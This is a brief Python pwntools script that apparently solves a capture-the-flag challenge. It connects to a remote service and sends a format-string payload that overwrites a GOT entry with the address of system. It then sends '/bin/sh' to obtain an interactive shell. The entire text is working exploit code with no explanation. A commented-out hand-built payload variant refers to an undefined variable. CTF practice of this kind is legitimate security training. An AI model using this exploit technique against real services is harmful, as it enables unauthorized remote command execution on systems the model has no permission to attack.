from pwn import *

got_ptf=0x804a00c
_sys=0x8048410

r=remote('bamboofox.cs.nctu.edu.tw',22003)
#payload1=p32(got_ptf)+"%"+str(got_sys&0xffff)+"x%7$hn"
payload1=fmtstr_payload(7,{got_ptf:_sys})
print payload1,hex(len(payload1))
r.sendline(payload1)
#r.recv()
r.sendline('/bin/sh\0')
print 'PWN!'
r.interactive()
